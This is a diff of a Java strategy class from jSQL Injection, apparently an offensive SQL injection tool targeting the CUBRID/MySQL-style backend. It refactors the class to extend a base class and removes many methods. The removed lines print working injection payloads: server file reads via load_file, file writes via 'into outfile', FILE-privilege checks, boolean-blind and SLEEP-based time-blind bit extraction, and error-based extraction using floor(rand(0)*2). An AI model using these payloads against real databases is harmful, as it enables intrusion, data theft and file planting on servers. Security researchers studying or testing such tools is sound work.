@@ -10,7 +10,7 @@ import com.jsql.model.blind.ConcreteTimeInjection;
 import com.jsql.model.injection.MediatorModel;
 import com.jsql.tool.ToolsString;
 
-public class CubridStrategy implements ISQLStrategy {
+public class CubridStrategy extends ASQLStrategy {
 
     @Override
     public String getSchemaInfos() {
@@ -141,170 +141,6 @@ public class CubridStrategy implements ISQLStrategy {
     }
 
     @Override
-    public String getPrivilege() {
-        return 
-            /**
-             * error base mysql remplace '%01%03%03%07' en \x01\x03\x03\x07
-             * => forcage en charactère
-             */
-            "cast(" +
-                "concat(" +
-                    "(" +
-                        "select+" +
-                            "if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") + ")" +
-                        "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
-                        "where+" +
-                            "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
-                            "and+PRIVILEGE_TYPE=0x46494c45" +
-                    ")" +
-                    "," +
-                    "'%01%03%03%07'" +
-                ")" +
-            "+as+char)";
-    }
-
-    @Override
-    public String readTextFile(String filePath) {
-        return 
-            /**
-             * error base mysql remplace '%01%03%03%07' en \x01\x03\x03\x07
-             * => forcage en charactère
-             */
-             "cast(" +
-                 "concat(load_file(0x" + ToolsString.strhex(filePath) + "),'%01%03%03%07')" +
-             "as+char)";
-    }
-
-    @Override
-    public String writeTextFile(String content, String filePath) {
-        return 
-            MediatorModel.model().initialQuery
-                .replaceAll(
-                    "1337" + MediatorModel.model().visibleIndex + "7331",
-                    "(select+0x" + ToolsString.strhex(content) + ")"
-                )
-                .replaceAll("--++", "")
-                + "+into+outfile+\"" + filePath + "\"--+";
-    }
-
-    @Override
-    public String[] getListFalseTest() {
-        return new String[]{"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};
-    }
-
-    @Override
-    public String[] getListTrueTest() {
-        return new String[]{"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};
-    }
-
-    @Override
-    public String getBlindFirstTest() {
-        return "0%2b1=1";
-    }
-
-    @Override
-    public String blindCheck(String check) {
-        return "+and+" + check + "--+";
-    }
-
-    @Override
-    public String blindBitTest(String inj, int indexCharacter, int bit) {
-        return "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
-    }
-
-    @Override
-    public String blindLengthTest(String inj, int indexCharacter) {
-        return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
-    }
-
-    @Override
-    public String timeCheck(String check) {
-        return "+and+if(" + check + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
-    }
-
-    @Override
-    public String timeBitTest(String inj, int indexCharacter, int bit) {
-        return "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
-    }
-
-    @Override
-    public String timeLengthTest(String inj, int indexCharacter) {
-        return "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
-    }
-
-    @Override
-    public String blindStrategy(String sqlQuery, String startPosition) {
-        return 
-            "(" +
-                "select+" +
-                "concat(" +
-                    "'SQLi'," +
-                    "substr(" +
-                        "(" + sqlQuery + ")," +
-                        startPosition + "," +
-                        MediatorModel.model().performanceLength +
-                    ")" +
-                ")" +
-            ")";
-    }
-
-    @Override
-    public String getErrorBasedStrategyCheck() {
-        return 
-            "+and(" +
-                "select+1+" +
-                "from(" +
-                    "select+" +
-                        "count(*)," +
-                        "floor(rand(0)*2)" +
-                    "from+" +
-                        "information_schema.tables+" +
-                    "group+by+2" +
-                ")a" +
-            ")--+";
-    }
-
-    @Override
-    public String errorBasedStrategy(String sqlQuery, String startPosition) {
-        return 
-            "+and" +
-                "(" +
-                "select+" +
-                    "1+" +
-                "from(" +
-                    "select+" +
-                        "count(*)," +
-                        "concat(" +
-                            "'SQLi'," +
-                            "replace(" +
-                                "substr(" +
-                                    "replace(" +
-                                        "(" + sqlQuery + ")" +
-                                    /**
-                                     * message error base remplace le \r en \r\n => pb de comptage
-                                     * Fix: remplacement forcé 0x0D => 0x0000
-                                     */
-                                    ",'%0d','%00%00')," +
-                                    startPosition + "," +
-                                    /**
-                                     * errorbase renvoit 64 caractères: 'SQLi' en consomme 4
-                                     * inutile de renvoyer plus de 64
-                                     */
-                                    "60" +
-                                ")" +
-                            /**
-                             * rétablissement 0x0000 => 0x0D
-                             */
-                            ",'%00%00','%0d')," +
-                            "floor(rand(0)*2)" +
-                        ")" +
-                    "from+information_schema.tables+" +
-                    "group+by+2" +
-                ")a" +
-            ")--+";
-    }
-
-    @Override
     public String normalStrategy(String sqlQuery, String startPosition) {
         return 
         "(" +
@@ -324,22 +160,6 @@ public class CubridStrategy implements ISQLStrategy {
                     ")" +
                 ")" +
         ")";
-    }
-
-    @Override
-    public String timeStrategy(String sqlQuery, String startPosition) {
-        return 
-            "(" +
-                "select+" +
-                    "concat(" +
-                        "'SQLi'," +
-                        "substr(" +
-                            "(" + sqlQuery + ")," +
-                            startPosition + "," +
-                            "65536" +
-                        ")" +
-                    ")" +
-            ")";
     }
 
     @Override
